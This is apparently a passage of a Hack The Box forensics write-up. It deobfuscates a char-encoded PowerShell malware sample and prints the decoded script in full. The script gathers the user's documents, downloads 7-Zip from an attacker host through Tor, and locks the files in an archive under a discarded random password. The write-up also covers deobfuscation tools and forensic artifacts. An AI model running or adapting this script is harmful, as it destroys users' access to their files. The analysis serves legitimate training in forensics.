[char]111 + [char]99 + [char]120 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]32 + [char]42 + [char]46 + [char]116 + [char]120 + [char]116 + [char]32 + [char]42 + [char]46 + [char]99 + [char]115 + [char]118 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]108 + [char]32 + [char]42 + [char]46 + [char]112 + [char]104 + [char]112 + [char]39 + [char]59 + [char]10 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]79 + [char]117 + [char]116 + [char]32 + [char]61 + [char]32 + [char]39 + [char]68 + [char]101 + [char]115 + [char]107 + [char]116 + [char]111 + [char]112 + [char]92 + [char]65 + [char]108 + [char]108 + [char]89 + [char]111 + [char]117 + [char]114 + [char]82 + [char]101 + [char]108 + [char]105 + [char]107 + [char]82 + [char]101 + [char]115 + [char]101 + [char]97 + [char]114 + [char]99 + [char]104 + [char]72 + [char]97 + [char]104 + [char]97 + [char]104 + [char]97 + [char]95 + [char]123 + [char]48 + [char]125 + [char]46 + [char]122 + [char]105 + [char]112 + [char]39 + [char]32 + [char]45 + [char]102 + [char]32 + [char]40 + [char]71 + [char]101 + [char]116 + [char]45 + [char]82 + [char]97 + [char]110 + [char]100 + [char]111 + [char]109 + [char]32 + [char]45 + [char]77 + [char]105 + [char]110 + [char]105 + [char]109 + [char]117 + [char]109 + [char]32 + [char]49 + [char]48 + [char]48 + [char]48 + [char]48 + [char]48 + [char]32 + [char]45 + [char]77 + [char]97 + [char]120 + [char]105 + [char]109 + [char]117 + [char]109 + [char]32 + [char]50 + [char]48 + [char]48 + [char]48 + [char]48 + [char]48 + [char]41 + [char]46 + [char]84 + [char]111 + [char]83 + [char]116 + [char]114 + [char]105 + [char]110 + [char]103 + [char]40 + [char]41 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]80 + [char]97 + [char]115 + [char]115 + [char]32 + [char]61 + [char]32 + [char]39 + [char]45 + [char]112 + [char]39 + [char]32 + [char]43 + [char]32 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]59 + [char]10 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]83 + [char]116 + [char]97 + [char]114 + [char]116 + [char]45 + [char]80 + [char]114 + [char]111 + [char]99 + [char]101 + [char]115 + [char]115 + [char]32 + [char]45 + [char]87 + [char]105 + [char]110 + [char]100 + [char]111 + [char]119 + [char]83 + [char]116 + [char]121 + [char]108 + [char]101 + [char]32 + [char]72 + [char]105 + [char]100 + [char]100 + [char]101 + [char]110 + [char]32 + [char]45 + [char]87 + [char]97 + [char]105 + [char]116 + [char]32 + [char]45 + [char]70 + [char]105 + [char]108 + [char]101 + [char]80 + [char]97 + [char]116 + [char]104 + [char]32 + [char]36 + [char]116 + [char]109 + [char]112 + [char]39 + [char]92 + [char]55 + [char]122 + [char]46 + [char]101 + [char]120 + [char]101 + [char]39 + [char]32 + [char]45 + [char]65 + [char]114 + [char]103 + [char]117 + [char]109 + [char]101 + [char]110 + [char]116 + [char]76 + [char]105 + [char]115 + [char]116 + [char]32 + [char]39 + [char]97 + [char]39 + [char]44 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]79 + [char]117 + [char]116 + [char]44 + [char]32 + [char]39 + [char]45 + [char]114 + [char]39 + [char]44 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]69 + [char]120 + [char]116 + [char]101 + [char]110 + [char]115 + [char]105 + [char]111 + [char]110 + [char]115 + [char]44 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]80 + [char]97 + [char]115 + [char]115 + [char]32 + [char]45 + [char]69 + [char]114 + [char]114 + [char]111 + [char]114 + [char]65 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]83 + [char]116 + [char]111 + [char]112 + [char]59 + [char]10 + [char]125 + [char]10 + [char]10 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]32 + [char]61 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]80 + [char]97 + [char]115 + [char]115 + [char]59 + [char]10 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]32 + [char]61 + [char]32 + [char]64 + [char]40 + [char]109 + [char]97 + [char]107 + [char]101 + [char]70 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]41 + [char]59 + [char]10 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]82 + [char]101 + [char]115 + [char]117 + [char]108 + [char]116 + [char]32 + [char]61 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]70 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]84 + [char]97 + [char]98 + [char]108 + [char]101 + [char]32 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]59 + [char]10 + [char]99 + [char]111 + [char]109 + [char]112 + [char]114 + [char]101 + [char]115 + [char]115 + [char]32 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]59 + [char]10 + [char]36 + [char]84 + [char]111 + [char]112 + [char]83 + [char]101 + [char]99 + [char]114 + [char]101 + [char]116 + [char]67 + [char]111 + [char]100 + [char]101 + [char]84 + [char]111 + [char]68 + [char]105 + [char]115 + [char]97 + [char]98 + [char]108 + [char]101 + [char]83 + [char]99 + [char]114 + [char]105 + [char]112 + [char]116 + [char]32 + [char]61 + [char]32 + [char]34 + [char]72 + [char]84 + [char]66 + [char]123 + [char]89 + [char]48 + [char]85 + [char]95 + [char]67 + [char]52 + [char]110 + [char]116 + [char]95 + [char]83 + [char]116 + [char]48 + [char]112 + [char]95 + [char]84 + [char]104 + [char]51 + [char]95 + [char]65 + [char]108 + [char]108 + [char]105 + [char]52 + [char]110 + [char]99 + [char]51 + [char]125 + [char]34 + [char]10
echo $out | Out-File -FilePath .\out.txt
```
In PowerShell you can define a char object and place the number behind it to
get the actual char value. For example `[char]35 → #`. By executing the script
the char values are automatically replaced by their characters. The output of
the `echo` command will reveal the original PowerShell command and also the flag.
```powershell
### .     .       .  .   . .   .   . .    +  .
###   .     .  :     .    .. :. .___---------___.
###        .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
###     .  :       .  .  .:../:            . .^  :.:\.
###         .   . :: +. :.:/: .   .    .        . . .:\
###  .  :    .     . _ :::/:                         .:\
###   .. . .   . - : :.:./.                           .:\
###  .   .     : . : .:.|. ######               #######::|
###   :.. .  :-  : .:  ::|.#######             ########:|
###  .  .  .  ..  .  .. :\ ########           ######## :/
###   .        .+ :: : -.:\ ########         ########.:/
###     .  .+   . . . . :.:\. #######       #######..:/
###       :: . . . . ::.:..:.\                   ..:/
###    .   .   .  .. :  -::::.\.       | |       .:/
###       .  :  .  .  .-:.":.::.\               .:/
###  .      -.   . . . .: .:::.:.\            .:/
### .   .   .  :      : ....::_:..:\   ___   :/
###    .   .  .   .:. .. .  .: :.:.:\       :/
###      +   .   .   : . ::. :.:. .:.|\  .:/|
### SCRIPT TO DELAY HUMAN RESEARCH ON RELIC RECLAMATION
### STAY QUIET - HACK THE HUMANS - STEAL THEIR SECRETS - FIND THE RELIC
### GO ALLIENS ALLIANCE !!!
function makePass
{
    $alph=@();
    65..90|foreach-object{$alph+=[char]$_};
    $num=@();
    48..57|foreach-object{$num+=[char]$_};
    
    $res = $num + $alph | Sort-Object {Get-Random};
    $res = $res -join '';
    return $res; 
}

function makeFileList
{
    $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php;
    $List = $files -split '\r';
    return $List;
}

function compress($Pass)
{
    $tmp = $env:TEMP;
    $s = 'https://relic-reclamation-anonymous.alien:1337/prog/';
    $link_7zdll = $s + '7z.dll';
    $link_7zexe = $s + '7z.exe';
    
    $7zdll = '"'+$tmp+'\7z.dll"';
    $7zexe = '"'+$tmp+'\7z.exe"';
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll;
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe;
    
    $argExtensions = '*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php';

    $argOut = 'Desktop\AllYourRelikResearchHahaha_{0}.zip' -f (Get-Random -Minimum 100000 -Maximum 200000).ToString();
    $argPass = '-p' + $Pass;

    Start-Process -WindowStyle Hidden -Wait -FilePath $tmp'\7z.exe' -ArgumentList 'a', $argOut, '-r', $argExtensions, $argPass -ErrorAction Stop;
}

$Pass = makePass;
$fileList = @(makeFileList);
$fileResult = makeFileListTable $fileList;
compress $Pass;
$TopSecretCodeToDisableScript = "HTB{not-the-real-flag}"
```

## Deobfuscate PowerShell script using tools
Beside solving it by myself, I also tried which tools were able to do the same.
I found two deobfuscators for this job:
- [PowerDecode](https://github.com/Malandrone/PowerDecode)
- [PSDecode](https://github.com/R3MRUM/PSDecode)
In order to solve it, I needed both tools. You can use PowerDecode to
automatically replace the variables with their actual values. To turn all those
char objects into valid characters, we can use PSDecode. The following commands
have been used:
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

.\PowerDecode.bat #choose 2,2,@

Import-Module PSDecode
PSDecode -dump -beautify -verbose .\powershell.txt
```

## Bonus Artifact 1
There is another way to find `ConsoleHost_history.txt` using Windows Prefetch
files. Those show what files the selected program has accessed.
```powershell
.\PECmd.exe -f 'D:\C\Windows\prefetch\POWERSHELL.EXE-CA1AE517.pf'
```

## Bonus Artifact 2
After the challenge I wondered if I couldn’t read the file that easily, how did
the hacker execute it then? For that I searched for the filename
`ActiveSyncProvider.dll:hidden.ps1` on the virtual hard disk.
```powershell
Get-ChildItem -Recurse | Select-String "powershell.exe" -List | Select Path
-> D:\C\Windows\System32\WDI\LogFiles\BootPerfDiagLogger.etl
```
I found the file `BootPerfDIagLogger.etl` which according to
[Stack Overflow](https://stackoverflow.com/questions/71539790/how-do-i-solve-the-type-or-namespace-windows-does-not-exist-in-namespace-micros)
records “useful forensic security info, such as every process that ran
persistently at boot”. Using a tool named
[PerfView](https://www.microsoft.com/en-us/download/details.aspx?id=28567) you
can see the content of this file. Which shows the PowerShell command that
executes the script.
![Hacker Execution Command](/assets/img/artifacts-bonus-2.png)
